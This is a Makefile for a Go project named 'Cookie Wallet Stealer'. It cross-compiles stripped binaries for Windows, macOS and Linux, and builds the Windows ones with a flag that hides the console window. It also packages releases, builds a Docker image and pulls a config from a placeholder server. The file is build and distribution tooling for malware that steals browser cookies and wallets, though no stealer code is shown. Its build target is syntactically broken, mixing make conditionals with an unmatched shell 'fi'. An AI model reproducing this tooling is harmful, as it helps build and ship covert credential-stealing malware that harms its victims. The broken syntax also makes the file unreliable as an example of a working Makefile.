# Makefile for Cookie Wallet Stealer

.PHONY: all build windows darwin linux clean test deploy release

# Variables
APP_NAME := stealer
VERSION ?= 1.0.0
LDFLAGS ?= -s -w -X main.Version=$(VERSION)
LINUX_LDFLAGS ?= -s -w
DARWIN_LDFLAGS ?= -s -w -extldflags '-framework CoreFoundation'
WINDOWS_LDFLAGS ?= -s -w -H=windowsgui

# Default target
all: build

# Build for current platform
build:
	@echo "Building $(APP_NAME) v$(VERSION)..."
	@mkdir -p dist
	ifeq ($(OS),Windows_NT)
		$(MAKE) windows
	else
		case $$(uname -s) in \
			Darwin) $(MAKE) darwin ;; \
			Linux)  $(MAKE) linux ;; \
		esac
	fi

# Windows build
windows:
	@echo "Building Windows binary..."
	CGO_ENABLED=1 GOOS=windows GOARCH=amd64 go build -ldflags="$(WINDOWS_LDFLAGS)" -o dist/$(APP_NAME)-windows-amd64.exe
	CGO_ENABLED=1 GOOS=windows GOARCH=arm64 go build -ldflags="$(WINDOWS_LDFLAGS)" -o dist/$(APP_NAME)-windows-arm64.exe

# macOS build
darwin:
	@echo "Building macOS binary..."
	CGO_ENABLED=1 GOOS=darwin GOARCH=amd64 go build -ldflags="$(DARWIN_LDFLAGS)" -o dist/$(APP_NAME)-darwin-amd64
	CGO_ENABLED=1 GOOS=darwin GOARCH=arm64 go build -ldflags="$(DARWIN_LDFLAGS)" -o dist/$(APP_NAME)-darwin-arm64

# Linux build
linux:
	@echo "Building Linux binary..."
	CGO_ENABLED=1 GOOS=linux GOARCH=amd64 go build -ldflags="$(LINUX_LDFLAGS)" -o dist/$(APP_NAME)-linux-amd64
	CGO_ENABLED=1 GOOS=linux GOARCH=arm64 go build -ldflags="$(LINUX_LDFLAGS)" -o dist/$(APP_NAME)-linux-arm64

# Cross-compilation for all platforms
cross:
	$(MAKE) windows
	$(MAKE) darwin
	$(MAKE) linux

# Clean build artifacts
clean:
	rm -rf dist
	find . -name "*.exe" -delete
	find . -name "*~" -delete

# Run tests
test:
	go test ./...

# Deploy (copy to system locations)
deploy: build
	@echo "Deploying $(APP_NAME)..."
	cp dist/$(APP_NAME)-$(shell go env GOOS)-$(shell go env GOARCH)$(shell [ $(shell go env GOOS) = "windows" ] && echo .exe) /usr/local/bin/$(APP_NAME)
	chmod +x /usr/local/bin/$(APP_NAME)

# Package for release
release: cross
	@echo "Creating release package..."
	cd dist && zip -r $(APP_NAME)-$(VERSION)-all.zip *

# Generate config
config:
	curl -s https://your-config-server.com/config.json > stealer_config.json
	@echo "Generated default config"

# Docker build
docker:
	docker build -t cookie-stealer .

.PHONY: help
help:
	@echo "Available targets:"
	@echo "  build     - Build for current platform"
	@echo "  windows   - Build Windows binary"
	@echo "  darwin    - Build macOS binary"
	@echo "  linux     - Build Linux binary"
	@echo "  cross     - Build for all platforms"
	@echo "  clean     - Clean build artifacts"
	@echo "  test      - Run tests"
	@echo "  deploy    - Deploy to system"
	@echo "  release   - Create release package"
	@echo "  config    - Generate configuration"
	@echo "  docker    - Build Docker image"
